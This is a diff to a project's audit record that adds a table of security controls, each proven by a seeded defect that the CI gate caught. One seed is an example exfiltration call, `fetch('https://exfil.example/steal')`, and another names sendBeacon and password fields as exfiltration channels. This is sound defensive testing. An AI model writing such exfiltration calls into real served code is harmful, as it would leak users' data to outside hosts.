@@ -36,3 +36,16 @@ change fails CI. (This is the amendment-gate proof for Phase 7.)
 Every PASS/NOT-APPLICABLE verdict (27) was attacked by an independent agent; 14 were overturned
 (recorded in `audit/03-findings.json` history). The two PASS verdicts that survive (A-02, A-16) each
 carry a control watched above.
+
+---
+
+## Track C watched controls (Phase 5'/6' — each SEEN to block)
+
+| Control | Re-introduced defect (seed) | Blocked by | Watched |
+|---|---|---|---|
+| `62-security-surface` egress allowlist | D7: `fetch('https://exfil.example/steal')` in a served file | C-08/C-28 egress assertion | ✓ CAUGHT (undeclared egress host 'exfil.example') |
+| `61-provenance` hash-drift | D8: edit `bubblegauge.jsx` without re-attesting the manifest | C-37 attested-chain reconstruction | ✓ CAUGHT (provenance hash drift for bubblegauge.jsx) |
+| `62-security-surface` telemetry/channel | D9: `navigator.sendBeacon` / `type=password` in a served file | C-23/C-04 surface tripwire | ✓ CAUGHT (persistent/exfil channel + telemetry sink) |
+| `61-provenance` SBOM | mismatch SBOM vs pinned-deps / non-empty AI-BOM | C-26 SBOM assertion | ✓ asserted every build (blocks on drift) |
+
+Calibration corpus grew 6/6 → **9/9** (D7/D8/D9 added). Gate self-test (`50-gate-selftest`) still proves the gate blocks null-standing-control PASS, a production_eligible lie, count drift, and a failed required test. Full suite: **41 pass · 0 fail · 5 offline-SRI**; mutation **13/13 = 1.00**.
